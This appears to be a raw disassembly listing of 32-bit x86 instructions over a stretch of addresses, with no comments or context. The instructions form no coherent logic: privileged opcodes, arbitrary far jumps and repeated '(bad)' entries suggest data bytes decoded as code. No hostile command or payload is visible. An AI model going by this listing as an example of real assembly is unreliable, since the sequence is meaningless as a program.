  41d0e6:	ror    DWORD PTR gs:[esi+eiz*1-0x47b23423],cl
  41d0ee:	push   ss
  41d0ef:	adc    cl,BYTE PTR [edi]
  41d0f1:	add    esp,edi
  41d0f3:	pop    edi
  41d0f4:	pop    ds
  41d0f5:	jbe    0x41d0ae
  41d0f7:	jmp    0x41d160
  41d0f9:	retf   
  41d0fa:	jp     0x41d16a
  41d0fc:	gs pop es
  41d0fe:	bound  esi,QWORD PTR fs:[edx+ebx*8]
  41d102:	jmp    0x89c1:0x2eb9b979
  41d109:	cmp    DWORD PTR [edx+0x71],esp
  41d10c:	add    BYTE PTR [esi+0x43dd058],0x79
  41d113:	and    dl,BYTE PTR [edi+0x7dcd3bfe]
  41d119:	push   esp
  41d11a:	lea    ebp,[edx-0x28d844f5]
  41d120:	cmp    eax,0x841a0dd
  41d125:	adc    bl,bl
  41d127:	pop    es
  41d128:	push   ebx
  41d129:	cmc    
  41d12a:	retf   0x6407
  41d12d:	push   esi
  41d12e:	mov    edi,0x36da13a2
  41d133:	jae    0x41d0de
  41d135:	push   esp
  41d136:	sbb    DWORD PTR [edi],ebx
  41d138:	das    
  41d139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d13a:	shl    BYTE PTR [ecx-0x37],1
  41d13d:	in     al,dx
  41d13e:	call   DWORD PTR ds:0xda26107b
  41d144:	sub    al,0xeb
  41d146:	push   esi
  41d147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d148:	pop    edx
  41d149:	jo     0x41d175
  41d14b:	rcr    dl,cl
  41d14d:	mov    edx,0xe0c519d7
  41d152:	cli    
  41d153:	cmp    edx,esi
  41d155:	sub    eax,0x97ce47ec
  41d15a:	xchg   DWORD PTR [esi+eiz*2-0x62d2d0ac],ecx
  41d161:	jns    0x41d140
  41d163:	jb     0x41d127
  41d165:	jns    0x41d134
  41d167:	bnd jo 0x41d1e1
  41d16a:	inc    edi
  41d16b:	les    eax,FWORD PTR ds:0x274299f5
  41d171:	pop    esp
  41d172:	pusha  
  41d173:	mov    al,0xdf
  41d175:	lahf   
  41d176:	push   eax
  41d177:	fnstcw WORD PTR [eax-0x29]
  41d17a:	mov    cl,0xce
  41d17c:	fstp   DWORD PTR [ecx-0x78]
  41d17f:	jmp    0x4644:0x45dfd51
  41d186:	push   cs
  41d187:	mov    ecx,0x54fb1199
  41d18c:	lea    esp,[edx-0x3ddb2758]
  41d192:	mov    dh,0x2f
  41d194:	pushf  
  41d195:	rcl    DWORD PTR [ecx+0x48],1
  41d198:	mov    bh,0xf1
  41d19a:	push   esp
  41d19b:	mov    bh,0xeb
  41d19d:	xchg   edi,eax
  41d19e:	jmp    0x19fb:0x27578a1c
  41d1a5:	pusha  
  41d1a6:	shl    DWORD PTR [edx-0x10edd2b5],1
  41d1ac:	inc    ebx
  41d1ad:	xor    al,0x50
  41d1af:	pusha  
  41d1b0:	xchg   ebx,eax
  41d1b1:	icebp  
  41d1b2:	sub    al,0x53
  41d1b4:	ins    DWORD PTR es:[edi],dx
  41d1b5:	push   ebp
  41d1b6:	mov    cl,0x49
  41d1b8:	stos   BYTE PTR es:[edi],al
  41d1b9:	mov    ch,0x18
  41d1bb:	pop    ebp
  41d1bc:	inc    ebp
  41d1bd:	test   dl,cl
  41d1bf:	repz lock popf 
  41d1c2:	ret    
  41d1c3:	or     dl,BYTE PTR [ebx]
  41d1c5:	cmp    al,0x26
  41d1c7:	xchg   DWORD PTR [edi],edi
  41d1c9:	push   es
  41d1ca:	inc    ecx
  41d1cb:	add    DWORD PTR [ebp-0x71],esi
  41d1ce:	and    DWORD PTR ds:0xc4e6bafc,edi
  41d1d4:	jo     0x41d1f2
  41d1d6:	loop   0x41d1a6
  41d1d8:	add    bl,BYTE PTR [ecx+0x24]
  41d1db:	mov    edx,0x455c78fd
  41d1e0:	add    al,0x84
  41d1e2:	sti    
  41d1e3:	in     eax,0xac
  41d1e5:	cmc    
  41d1e6:	rcr    cl,1
  41d1e8:	stc    
  41d1e9:	std    
  41d1ea:	pusha  
  41d1eb:	into   
  41d1ec:	jle    0x41d256
  41d1ee:	jmp    0xc718:0x6932a47e
  41d1f5:	jno    0x41d1fe
  41d1f7:	(bad)  
  41d1f8:	mov    ds:0x7510c4fe,eax
  41d1fd:	cmp    ecx,DWORD PTR [ebp+esi*1-0x399deaa1]
  41d204:	and    al,0x51
  41d206:	mov    BYTE PTR [eax-0x39],dh
  41d209:	aaa    
  41d20a:	mov    BYTE PTR [edx],ah
  41d20c:	or     DWORD PTR [esi+0x20],0x3bfa5607
  41d213:	fadd   QWORD PTR [ecx+esi*1-0x9]
  41d217:	adc    bl,bl
  41d219:	mov    dl,ch
  41d21b:	cmp    edi,DWORD PTR [edx+eiz*1-0x6ff9e419]
  41d222:	xor    ecx,DWORD PTR [ebp-0x25f46d1c]
  41d228:	retf   0x80e0
  41d22b:	rcr    bh,0x6d
  41d22e:	aaa    
  41d22f:	jmp    0xbc6:0xf7fff718
  41d236:	dec    ebp
  41d237:	(bad)  
  41d239:	fmul   QWORD PTR [edx-0x8]
  41d23c:	leave  
  41d23d:	sub    eax,0xc1f20062
  41d242:	arpl   WORD PTR [esi],bp
  41d244:	(bad)  
  41d245:	mov    dl,0xe4
  41d247:	pop    edx
  41d248:	inc    edi
  41d249:	mov    eax,ds:0x8a61b9b1
  41d24e:	cmp    al,0xbc
  41d250:	aas    
  41d251:	pop    ss
  41d252:	fst    DWORD PTR [edi]
  41d254:	cmp    esp,eax
  41d256:	jge    0x41d21c
  41d258:	in     eax,0x84
  41d25a:	dec    esi
  41d25b:	test   DWORD PTR [edi],0xb295397
  41d261:	push   ebp
  41d262:	mov    al,ds:0x2d3c960b
  41d267:	dec    esp
  41d268:	inc    eax
  41d269:	sti    
  41d26a:	arpl   WORD PTR [ebp+0x3ff2cf08],sp
  41d270:	inc    ebx
  41d271:	inc    esp
  41d272:	inc    eax
  41d273:	push   esp
  41d274:	stos   BYTE PTR es:[edi],al
  41d275:	cmc    
  41d276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d277:	dec    ebx
  41d278:	outs   dx,BYTE PTR ds:[esi]
  41d279:	push   ebx
  41d27a:	and    bl,bl
  41d27c:	add    dh,BYTE PTR ds:0xf2793d08
  41d282:	inc    ecx
  41d283:	inc    edx
  41d284:	je     0x41d2aa
  41d286:	or     eax,0x6cded20b
  41d28b:	pushf  
  41d28c:	push   cs
  41d28d:	sbb    eax,0xc3e3f79f
  41d292:	pop    ss
  41d293:	pop    eax
  41d294:	lds    ebx,FWORD PTR [ecx]
  41d296:	xchg   ebx,eax
  41d297:	cmp    DWORD PTR [ecx+0x5d],0x2b
  41d29b:	pop    esp
  41d29c:	xor    DWORD PTR ds:0x9e90452b,esp
  41d2a2:	jno    0x41d2fb
  41d2a4:	and    eax,0x7a7587
  41d2a9:	adc    edx,ebp
  41d2ab:	clc    
  41d2ac:	loop   0x41d279
  41d2ae:	arpl   WORD PTR [edx+ebx*1+0x64ec4f37],cx
  41d2b5:	call   0x18c82de4
  41d2ba:	fstp   TBYTE PTR [ecx-0x18]
  41d2bd:	aaa    
  41d2be:	into   
  41d2bf:	lea    ecx,[ecx]
  41d2c1:	xchg   ebx,eax
  41d2c2:	lods   eax,DWORD PTR ds:[esi]
  41d2c3:	xor    BYTE PTR [ecx-0x7e52ff85],0x47
  41d2ca:	and    BYTE PTR [esi-0x4ba43b32],0x98
  41d2d1:	mov    esp,0xe6bd984a
  41d2d6:	add    DWORD PTR [edi-0x50],0x769388a2
  41d2dd:	mov    eax,0xbb473533
  41d2e2:	mov    dh,0x8b
  41d2e4:	inc    esp
  41d2e5:	int    0x8c
  41d2e7:	fld    DWORD PTR [edi+edi*2]
  41d2ea:	cmp    DWORD PTR [esi],esp
  41d2ec:	add    dh,BYTE PTR [ecx+esi*2+0x2b]
  41d2f0:	adc    BYTE PTR [edx-0x27],dl
  41d2f3:	adc    DWORD PTR [edx+edx*2-0x2ca08ad3],edx
  41d2fa:	sub    eax,0xf4304465
  41d2ff:	mov    dh,0x54
  41d301:	das    
  41d302:	ja     0x41d30e
  41d304:	sysexit 
  41d306:	xchg   DWORD PTR [ecx-0x681a6829],edi
  41d30c:	jo     0x41d356
  41d30e:	mov    ebx,0x91d7cfdd
  41d313:	sbb    al,BYTE PTR [ebp-0x665e458d]
  41d319:	xor    eax,0xfd9ab5f0
  41d31e:	mov    ds:0x532e3713,eax
  41d323:	pop    ds
  41d324:	in     al,0xe8
  41d326:	add    eax,0xe6e9f1f0
  41d32b:	mov    ebx,0x998b2dcf
  41d330:	iret   
  41d331:	shld   DWORD PTR [ecx],ecx,cl
  41d334:	fcmovbe st,st(1)
  41d336:	adc    DWORD PTR [esi+0x15],ebp
  41d339:	mov    esp,0x755f1a04
  41d33e:	inc    ebx
  41d33f:	arpl   di,di
  41d341:	fs push ss
  41d343:	sbb    eax,DWORD PTR [ebp+0x41a367c8]
  41d349:	popf   
  41d34a:	mov    ebp,0x3f354acd
  41d34f:	pop    es
  41d350:	or     ecx,DWORD PTR [eax]
  41d352:	nop
  41d353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d354:	pop    edx
  41d355:	arpl   WORD PTR ds:0x14217535,bp
  41d35b:	fxtract 
  41d35d:	ret    
  41d35e:	pop    ebx
  41d35f:	adc    al,0x64
  41d361:	sbb    eax,DWORD PTR [eax-0x50]
  41d364:	stc    
  41d365:	sub    al,0x2a
  41d367:	cld    
  41d368:	sub    al,0xfd
  41d36a:	int3   
  41d36b:	aad    0xbb
  41d36d:	mov    fs,ecx
  41d36f:	push   es
  41d370:	cmp    al,0x7e
  41d372:	adc    al,0xb8
  41d374:	ret    
  41d375:	mov    dl,0x5
  41d377:	clc    
  41d378:	arpl   WORD PTR [eax+edi*8+0x47341236],si
  41d37f:	test   al,0xbc
  41d381:	push   esi
  41d382:	sub    eax,DWORD PTR [ecx]
  41d384:	aaa    
  41d385:	xchg   ebp,eax
  41d386:	call   0x966f6881
  41d38b:	add    esi,0xe6745f4a
  41d391:	test   DWORD PTR [ebx-0x7f],esi
  41d394:	dec    ebp
  41d395:	test   al,0x5
  41d397:	rol    BYTE PTR [ebx+0x4c],1
  41d39a:	test   DWORD PTR [esi],0x3494bcd6
  41d3a0:	sub    DWORD PTR [eax-0x469b08ea],eax
  41d3a6:	in     eax,0x2f
  41d3a8:	stos   BYTE PTR es:[edi],al
  41d3a9:	scas   al,BYTE PTR es:[edi]
  41d3aa:	pop    esp
  41d3ab:	inc    eax
  41d3ac:	ins    DWORD PTR es:[edi],dx
  41d3ad:	sbb    dl,BYTE PTR [ebx-0x2]
  41d3b0:	or     al,0x3a
  41d3b2:	fadd   DWORD PTR [ebx]
  41d3b4:	sub    al,0x4e
  41d3b6:	pop    ebx
  41d3b7:	mov    BYTE PTR [esp+edi*4],dl
  41d3ba:	mov    al,0xe5
  41d3bc:	ins    BYTE PTR es:[edi],dx
  41d3bd:	inc    eax
  41d3be:	and    edi,DWORD PTR ds:0x2dac5671
  41d3c4:	das    
  41d3c5:	lds    edi,FWORD PTR [esi-0x44]
  41d3c8:	mov    eax,ds:0x97ed1948
  41d3cd:	mov    ecx,0x188e8662
  41d3d2:	add    ch,bh
  41d3d4:	cmp    esp,DWORD PTR [ecx+edi*8+0x45]
  41d3d8:	inc    ebx
  41d3d9:	fcmove st,st(2)
  41d3db:	popa   
  41d3dc:	jbe    0x41d442
  41d3de:	jae    0x41d3fa
  41d3e0:	and    esp,eax
  41d3e2:	fadd   st,st(5)
  41d3e4:	jb     0x41d3fb
  41d3e6:	jne    0x41d37a
  41d3e8:	shl    ah,0xbc
  41d3eb:	enter  0x7a8a,0x3d
  41d3ef:	pop    edi
  41d3f0:	daa    
  41d3f1:	push   cs
  41d3f2:	arpl   si,cx
  41d3f4:	adc    ch,bl
  41d3f6:	mov    dh,0x42
  41d3f8:	sbb    eax,0xded4267
  41d3fd:	add    bh,BYTE PTR [edi+0x31]
  41d400:	lahf   
  41d401:	xchg   esp,eax
  41d402:	dec    ecx
  41d403:	pop    ds
  41d404:	ds push ds
  41d406:	imul   edx,DWORD PTR [ecx+0x7814536],0x61aef2b4
  41d410:	fcomip st,st(4)
  41d412:	xlat   BYTE PTR ds:[ebx]
  41d413:	ins    DWORD PTR es:[edi],dx
  41d414:	jae    0x41d407
  41d416:	test   BYTE PTR [ebx-0xdb9afaa],cl
  41d41c:	(bad)  
  41d41d:	(bad)  
  41d41e:	iret   
  41d41f:	or     esp,0x49
  41d422:	xor    DWORD PTR [edx-0x20],ebx
  41d425:	sub    ah,BYTE PTR [ecx+0x3f952b5a]
  41d42b:	mov    bl,0x96
  41d42d:	push   cs
  41d42e:	mov    dl,0x3f
  41d430:	pop    eax
  41d431:	int3   
  41d432:	les    edi,FWORD PTR ds:0x1dfecc72
  41d438:	xchg   ebp,eax
  41d439:	shl    DWORD PTR [esi],0xa7
  41d43c:	cmp    al,0xc
  41d43e:	xlat   BYTE PTR ds:[ebx]
  41d43f:	popa   
  41d440:	mov    cl,0xd1
  41d442:	mov    dh,0x66
  41d444:	inc    ebp
  41d445:	mov    esi,0x7e4b0414
  41d44a:	dec    esp
  41d44b:	mov    ch,0xa4
  41d44d:	lods   al,BYTE PTR ds:[esi]
  41d44e:	mov    edi,0x31e5a15d
  41d453:	test   cl,ch
  41d455:	push   ds
  41d456:	(bad)  
  41d457:	stos   DWORD PTR es:[edi],eax
  41d458:	jmp    0xff6583cf
  41d45d:	mov    edi,DWORD PTR ds:0xefd9d2d0
  41d463:	push   0xa81139bb
  41d468:	sti    
  41d469:	fstp   QWORD PTR [edx]
  41d46b:	adc    BYTE PTR ds:0x1be27753,bl
  41d471:	(bad)  
  41d473:	out    0x9d,al
  41d475:	pop    edx
  41d476:	jbe    0x41d445
  41d478:	cmp    DWORD PTR [edx-0x3d4cb05e],edx
  41d47e:	inc    ebx
  41d47f:	test   al,0x4
  41d481:	jmp    0x41d4d0
  41d483:	xchg   edi,eax
  41d484:	jmp    0x675208d2
  41d489:	pushf  
  41d48a:	das    
  41d48b:	bound  ecx,QWORD PTR [esi-0x4d]
  41d48e:	push   0xfffffff6
  41d490:	pop    es
  41d491:	fisttp QWORD PTR [eax+ebx*4+0x6f]
  41d495:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41d497:	sub    al,0x1a
  41d499:	mov    cl,ah
  41d49b:	test   BYTE PTR [edi+edi*1+0x1a],ah
  41d49f:	rcl    BYTE PTR [esi+0x7ae7ff85],0xff
  41d4a6:	sbb    BYTE PTR [eax-0x67],ch
  41d4a9:	aad    0x91
  41d4ab:	std    
  41d4ac:	test   al,0x11
  41d4ae:	fs pusha 
  41d4b0:	and    al,0x9b
  41d4b2:	xchg   esi,eax
  41d4b3:	shr    DWORD PTR [ecx],cl
  41d4b5:	jg     0x41d533
  41d4b7:	push   ebx
  41d4b8:	and    ecx,DWORD PTR ds:0x2f44bb22
  41d4be:	int3   
  41d4bf:	int3   
  41d4c0:	jge    0x41d470
  41d4c2:	leave  
  41d4c3:	lock or DWORD PTR [ecx],0x7f
  41d4c7:	xchg   DWORD PTR [edi+0x7c9cddd1],edi
  41d4cd:	mov    ebx,0x68f39a75
  41d4d2:	scas   eax,DWORD PTR es:[edi]
  41d4d3:	inc    edi
  41d4d4:	mov    eax,ds:0x62578e2d
  41d4d9:	lahf   
  41d4da:	(bad)  
  41d4db:	push   esi
  41d4dc:	ffreep st(7)
  41d4de:	fbstp  TBYTE PTR [esi+0x7f]
  41d4e1:	(bad)  
  41d4e2:	les    ebp,FWORD PTR ss:[eax]
  41d4e5:	mov    al,0xa5
  41d4e7:	clc    
  41d4e8:	fwait
  41d4e9:	mov    dh,0xea
  41d4eb:	ins    DWORD PTR es:[edi],dx
  41d4ec:	out    0x90,eax
  41d4ee:	pop    edx
  41d4ef:	stc    
  41d4f0:	call   0xab37:0xa8f7c202
  41d4f7:	lea    esp,[ebx]
  41d4f9:	push   ss
  41d4fa:	cwde   
  41d4fb:	ss mov edi,es
  41d4fe:	or     edi,DWORD PTR ds:0xdd7230c9
  41d504:	xchg   ebx,eax
  41d505:	cmc    
  41d506:	jmp    0x5269:0xb851377a
  41d50d:	mov    dl,BYTE PTR [eax]
  41d50f:	outs   dx,DWORD PTR ds:[esi]
  41d510:	or     al,0xf7
  41d512:	xchg   ebx,eax
  41d513:	movsx  esi,cx
  41d516:	jp     0x41d4b6
  41d518:	ror    BYTE PTR [edi-0x7459f017],0xba
  41d51f:	pop    esp
  41d520:	adc    BYTE PTR [eax-0x6b7e4eba],bl
  41d526:	mov    bl,0xc8
  41d528:	pushf  
  41d529:	cmp    al,0x6d
  41d52b:	cmp    al,0x6
  41d52d:	(bad)  
  41d52e:	cmp    esi,DWORD PTR [esi+0x7c91acff]
  41d534:	pop    ebx
  41d535:	jg     0x41d58e
  41d537:	jno    0x41d521
  41d539:	add    BYTE PTR [edi+edi*8-0x4ad16c1c],cl
  41d540:	hlt    
  41d541:	(bad)  
  41d542:	imul   edi,DWORD PTR [esi-0x6],0x2d6f1ef0
  41d549:	ja     0x41d4e9
  41d54b:	cmp    esp,ebx
  41d54d:	jle    0x41d55f
  41d54f:	(bad)  
  41d550:	jb     0x41d511
  41d552:	scas   eax,DWORD PTR es:[edi]
  41d553:	stos   DWORD PTR es:[edi],eax
  41d554:	(bad)  
  41d555:	sub    eax,0x43e4e3a6
  41d55a:	aaa    
  41d55b:	inc    edi
  41d55c:	and    eax,0x67e272e7
  41d561:	outs   dx,BYTE PTR ds:[esi]
  41d562:	ds ins DWORD PTR es:[edi],dx
  41d564:	fdivr  QWORD PTR [ebx-0x2b]
  41d567:	(bad)  
  41d568:	xchg   esi,eax
  41d569:	and    eax,0x36dfbea6
  41d56e:	jmp    0x7a7bcbee
  41d573:	fadd   DWORD PTR [ebx+0x1e39145c]
  41d579:	mov    ecx,0xc207e1da
  41d57e:	fisubr WORD PTR [edi-0x3b529c14]
  41d584:	push   0xffffff80
  41d586:	lds    eax,FWORD PTR [ecx+0x25]
  41d589:	lods   eax,DWORD PTR ds:[esi]
  41d58a:	pop    esi
  41d58b:	sub    al,0xa6
  41d58d:	dec    esp
  41d58e:	out    0xe0,eax
  41d590:	(bad)  
  41d591:	jp     0x41d60f
  41d593:	add    eax,0x65116408
  41d598:	imul   BYTE PTR [eax+0x51]
  41d59b:	in     al,0xdc
  41d59d:	mov    cl,BYTE PTR cs:[edx]
  41d5a0:	xchg   ecx,eax
  41d5a1:	in     eax,dx
  41d5a2:	es push ecx
  41d5a4:	(bad)  
  41d5a5:	ds mov dl,0xff
  41d5a8:	xor    bh,BYTE PTR [edi+0x6b]
  41d5ab:	mov    ebx,0xd55ab240
  41d5b0:	inc    esp
  41d5b1:	mov    eax,0xc2af0b42
  41d5b6:	out    dx,eax
  41d5b7:	out    dx,al
  41d5b8:	test   eax,0x14bebee1
  41d5bd:	xchg   edx,eax
  41d5be:	loop   0x41d585
  41d5c0:	push   cs
  41d5c1:	push   ebx
  41d5c2:	imul   esi,DWORD PTR [ecx],0x53c9a22f
  41d5c8:	xor    eax,esp
  41d5ca:	out    dx,eax
  41d5cb:	fdivrp st(1),st
  41d5cd:	pop    esi
  41d5cf:	sub    al,0xf0
  41d5d1:	mov    esi,0x81d4edc2
  41d5d6:	repz leave 
  41d5d8:	add    bl,BYTE PTR [esi]
  41d5da:	jmp    0x41d653
  41d5dc:	in     eax,dx
  41d5dd:	push   ds
  41d5de:	dec    ebx
  41d5df:	jp     0x41d618
  41d5e1:	xchg   esp,eax
  41d5e2:	push   ecx
  41d5e3:	stos   DWORD PTR es:[edi],eax
  41d5e4:	arpl   di,ax
  41d5e6:	idiv   DWORD PTR [edi-0x7d28f886]
  41d5ec:	add    eax,0x81e9829c
  41d5f1:	pop    es
  41d5f2:	popf   
  41d5f3:	lods   al,BYTE PTR ds:[esi]
  41d5f4:	mov    ch,BYTE PTR [ebx]
  41d5f6:	repnz in eax,0x86
  41d5f9:	and    BYTE PTR [ebx-0x4655f135],dl
  41d5ff:	or     ah,al
  41d601:	call   0xf445:0x82289940
  41d608:	jbe    0x41d5cb
  41d60a:	push   es
  41d60b:	pusha  
  41d60c:	jb     0x41d605
  41d60e:	lods   eax,DWORD PTR ds:[esi]
  41d60f:	pop    esi
  41d610:	pop    edx
  41d611:	pop    edx
  41d612:	iret   
  41d613:	sbb    BYTE PTR [ebx],dh
  41d615:	mov    eax,0x6031f2ae
  41d61a:	or     eax,0xb9eeda26
  41d61f:	enter  0xa51e,0x2d
  41d623:	mov    cl,0xcb
  41d625:	adc    bl,bh
  41d627:	dec    edx
  41d628:	mov    bl,0xff
  41d62a:	pop    esi
  41d62b:	adc    eax,0xd1fc3f98
  41d630:	jns    0x41d67d
  41d632:	scas   al,BYTE PTR es:[edi]
  41d633:	popa   
  41d634:	sbb    DWORD PTR [ebx+0x5fcce786],esp
  41d63a:	inc    esi
  41d63b:	lods   eax,DWORD PTR ds:[esi]
  41d63c:	loope  0x41d698
  41d63e:	mov    al,ds:0x7a2b02b2
  41d643:	cmc    
  41d644:	outs   dx,DWORD PTR ds:[esi]
  41d645:	aam    0xfa
  41d647:	ja     0x41d619
  41d649:	sbb    ecx,DWORD PTR [edi+0x74]
  41d64c:	jmp    FWORD PTR [eax-0x6baa4bb8]
  41d652:	mov    bh,0x74
  41d654:	push   ds
  41d655:	mov    ds:0x95f2746f,al
  41d65a:	dec    ebx
  41d65b:	mov    esp,DWORD PTR [edx]
  41d65d:	and    BYTE PTR [ebx+0x48fd670a],cl
  41d663:	jo     0x41d5f4
  41d665:	sub    esi,DWORD PTR [edx]
  41d667:	and    ecx,ebx
  41d669:	ret    
  41d66a:	sbb    BYTE PTR [eax+ebx*8+0x20083767],dh
  41d671:	test   DWORD PTR [edi],0x8eb1c3df
  41d677:	lods   eax,DWORD PTR ds:[esi]
  41d678:	scas   al,BYTE PTR es:[edi]
  41d679:	aad    0xb9
  41d67b:	pop    ecx
  41d67c:	mov    al,0x54
  41d67e:	xor    ah,ah
  41d680:	hlt    
  41d681:	inc    ecx
  41d682:	jbe    0x41d631
  41d684:	mov    dl,0x5a
  41d686:	(bad)  
  41d687:	aam    0xc2
  41d689:	(bad)  
  41d68a:	cmp    eax,0xa01f6f5
  41d68f:	sbb    ah,ah
  41d691:	push   0xfa6a20fb
  41d696:	call   0x88d7bc10
  41d69b:	mov    ds:0x72d66283,al
  41d6a0:	or     cl,BYTE PTR [ebx+0x38]
  41d6a3:	loopne 0x41d6e1
  41d6a5:	sbb    al,0x12
  41d6a7:	int    0x51
  41d6a9:	cld    
  41d6aa:	or     dh,BYTE PTR [eax+0x36]
  41d6ad:	lds    ecx,FWORD PTR fs:[esi-0x2ae7326]
  41d6b4:	repnz stos DWORD PTR es:[edi],eax
  41d6b6:	pop    ss
  41d6b7:	pop    esi
  41d6b8:	into   
  41d6b9:	mov    WORD PTR [ebp-0x1372a84f],ds
  41d6bf:	mul    DWORD PTR [edx+0x4e]
  41d6c2:	adc    DWORD PTR [eax],ecx
  41d6c4:	mov    es,WORD PTR [eax+0x143ce174]
  41d6ca:	ja     0x41d663
  41d6cc:	das    
  41d6cd:	add    BYTE PTR [ebx],ah
  41d6cf:	push   0xffffff9a
  41d6d1:	ins    DWORD PTR es:[edi],dx
  41d6d2:	(bad)  
  41d6d3:	jl     0x41d71a
  41d6d5:	in     al,dx
  41d6d6:	sub    eax,DWORD PTR [ebx]
  41d6d8:	mov    ah,0xdd
  41d6da:	mov    esp,0x141dfbd1
  41d6df:	std    
  41d6e0:	add    al,0x8b
  41d6e2:	iret   
  41d6e3:	xor    BYTE PTR [ecx],al
  41d6e5:	pusha  
  41d6e6:	adc    bh,BYTE PTR [ebx+0x34473900]
  41d6ec:	jp     0x41d6d4
  41d6ee:	sub    eax,0xd33505f9
  41d6f3:	inc    edx
  41d6f4:	js     0x41d69a
  41d6f6:	mov    bh,BYTE PTR [ebx+edi*2-0x20344240]
  41d6fd:	xor    edx,DWORD PTR [esi]
  41d6ff:	xchg   edi,eax
  41d700:	push   edx
  41d701:	cmc    
  41d702:	dec    edi
  41d703:	adc    al,bh
  41d705:	inc    ecx
  41d706:	jne    0x41d6c2
  41d708:	dec    eax
  41d709:	jo     0x41d777
  41d70b:	pushf  
  41d70c:	push   es
  41d70d:	(bad)  
  41d70e:	gs loop 0x41d6a6
  41d711:	sbb    BYTE PTR [ebp-0x5269442f],dl
  41d717:	lods   al,BYTE PTR ds:[esi]
  41d718:	iret   
  41d719:	push   0xffffff81
  41d71b:	iret   
  41d71c:	push   0x2433a001
  41d721:	cmp    eax,0x548c04a1
  41d726:	and    DWORD PTR ds:0x6c7140df,ecx
  41d72c:	je     0x41d6f9
  41d72e:	add    al,0xe
  41d730:	inc    edx
  41d731:	mov    WORD PTR [ecx-0x5e34c0d9],es
  41d737:	mov    ecx,0xf1914b82
  41d73c:	dec    edx
  41d73d:	mov    eax,DWORD PTR [ebp+0x59]
  41d740:	imul   esi
  41d742:	in     eax,dx
  41d743:	std    
  41d744:	adc    eax,0x9047d964
  41d749:	jo     0x41d7b4
  41d74b:	stos   DWORD PTR es:[edi],eax
  41d74c:	jmp    0x1ca0:0x565c31c4
  41d753:	gs pop ebx
  41d755:	cs int 0xaa
  41d758:	(bad)  [edi+0x41]
  41d75b:	scas   eax,DWORD PTR es:[edi]
  41d75c:	xor    DWORD PTR [edi+0x37],ebx
  41d75f:	nop
  41d760:	or     BYTE PTR [ebp+0x4e4c6e90],ch
  41d766:	mov    ebx,0x3dbdf018
  41d76b:	stos   DWORD PTR es:[edi],eax
  41d76c:	xor    eax,0x1ccbec6a
  41d771:	into   
  41d772:	pushf  
  41d773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d774:	cmp    edx,DWORD PTR [edx+esi*8+0x32]
  41d778:	inc    esp
  41d779:	loop   0x41d7e9
  41d77b:	pop    es
  41d77c:	scas   eax,DWORD PTR es:[edi]
  41d77d:	pushw  0xffbc
  41d780:	fsub   QWORD PTR [eax]
  41d782:	adc    DWORD PTR [eax],eax
  41d784:	push   ebx
  41d785:	push   ds
  41d786:	icebp  
  41d787:	ret    
  41d788:	and    esp,DWORD PTR [ebx+ebp*2+0x34a86812]
  41d78f:	out    0x71,al
  41d791:	fisubr DWORD PTR [eax+0x1db901f7]
  41d797:	and    BYTE PTR [edx],dh
  41d799:	sub    al,0xf0
  41d79b:	jae    0x41d742
  41d79d:	jns    0x41d7a7
  41d79f:	shr    BYTE PTR [edi-0x16],0x1d
  41d7a3:	xor    DWORD PTR ds:0xce81f92,edi
  41d7a9:	mov    cl,BYTE PTR [ebx-0x35918eb5]
  41d7af:	and    al,0x2f
  41d7b1:	fs cwde 
  41d7b3:	mov    edi,DWORD PTR [ecx]
  41d7b5:	sub    al,0xa8
  41d7b7:	mov    cl,0x8
  41d7b9:	aaa    
  41d7ba:	aas    
  41d7bb:	inc    ebp
  41d7bc:	out    dx,al
  41d7bd:	xchg   edx,eax
  41d7be:	push   edx
  41d7bf:	xchg   ebx,eax
  41d7c0:	mov    al,0x9a
  41d7c2:	xor    al,0x11
  41d7c4:	lods   eax,DWORD PTR ds:[esi]
  41d7c5:	xor    eax,0xd1f4291a
  41d7ca:	jmp    DWORD PTR [esi-0x6b71ee86]
  41d7d0:	pop    esp
  41d7d1:	push   esi
  41d7d2:	xchg   edi,eax
  41d7d3:	cmp    ecx,DWORD PTR [esi+0x76f8311a]
  41d7d9:	or     cl,dh
  41d7db:	fwait
  41d7dc:	sbb    BYTE PTR [edi-0x64036bbd],al
  41d7e2:	inc    edx
  41d7e3:	inc    edi
  41d7e4:	mov    BYTE PTR [edi-0x3a121538],al
  41d7ea:	inc    eax
  41d7eb:	sub    DWORD PTR ds:0x4d8edc08,ebp
  41d7f1:	mov    al,BYTE PTR [edi+0x3225ed0f]
  41d7f7:	cs xchg edi,eax
  41d7f9:	jno    0x41d7f0
  41d7fb:	adc    eax,0xb8530b20
  41d800:	sub    al,BYTE PTR [esp+eax*4]
  41d803:	mov    ecx,?
  41d805:	dec    edx
  41d806:	fistp  QWORD PTR [ebx+edx*2]
  41d809:	jne    0x41d855
  41d80b:	adc    BYTE PTR [esi+0x649a4709],bh
  41d811:	push   es
  41d812:	cmp    ebx,DWORD PTR [ecx+0x7e]
  41d815:	aad    0x64
  41d817:	stos   BYTE PTR es:[edi],al
  41d818:	(bad)  
  41d819:	fist   WORD PTR [ecx+0x68]
  41d81c:	ja     0x41d7fd
  41d81e:	leave  
  41d81f:	sti    
  41d820:	leave  
  41d821:	stos   BYTE PTR es:[edi],al
  41d822:	mov    al,0xc4
  41d824:	jno    0x41d80c
  41d826:	push   ds
  41d827:	in     al,dx
  41d828:	jno    0x41d7dc
  41d82a:	(bad)  
  41d82b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d82c:	test   DWORD PTR [ebx+ecx*2],esi
  41d82f:	cwde   
  41d830:	add    DWORD PTR [ebx],eax
  41d832:	nop
  41d833:	adc    DWORD PTR [ecx+ebx*1+0x6c47fbfb],edx
  41d83a:	call   0xc7956b5d
  41d83f:	jp     0x41d7c1
  41d841:	int    0xf5
  41d843:	cmp    al,0xcc
  41d845:	pop    ds
  41d846:	cmp    BYTE PTR [esi+0x9],bl
  41d849:	(bad)  
  41d84a:	jle    0x41d7d2
  41d84c:	mov    gs,ecx
  41d84e:	out    0x2d,al
  41d850:	xor    BYTE PTR [edx-0x124bb159],bl
  41d856:	test   al,0xa7
  41d858:	mov    ds:0x8ac937f5,eax
  41d85d:	xor    al,0x5
  41d85f:	add    al,0x8c
  41d861:	(bad)  
  41d862:	loopne 0x41d88d
